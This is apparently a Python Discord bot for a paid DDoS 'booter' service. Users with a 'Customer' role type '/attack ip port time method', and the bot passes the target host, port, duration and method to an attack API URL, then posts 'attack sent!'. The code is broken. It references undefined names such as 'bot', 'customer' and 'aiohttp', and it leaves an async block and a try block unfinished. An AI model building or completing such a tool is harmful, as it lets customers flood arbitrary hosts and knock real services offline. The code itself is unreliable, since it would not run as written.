import discord
from discord.ext import commands
import os
import requests
import math
## Command Prefix
client = commands.Bot(command_prefix='/')

## How it works (default layout)
# /attack ip port time method

client.remove_command("help")

@client.event
async def on_ready():
  await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="TBN BABEEE"))
  print("Bot loaded")
  
  
@client.command()
@commands.has_any_role("Customer")
@commands.cooldown(1, 120, customer.BucketType.user) 
# ^^ 120 Can be swapped with any time you would like.
async def attack(ctx, arg1, arg2, arg3:int, arg4):
  try:
    async with aiohttp.ClientSession() as requests:
      async with requests.get(f"Pleaseaddyourkeyhere&host={arg1}&port={arg2}&time={arg3}&method={arg4}")
      embed1 = discord.Embed(title=f'attack sent! :droplet:',color=discord.Color.from_rgb(0, 191, 255))
      
client.run("")      
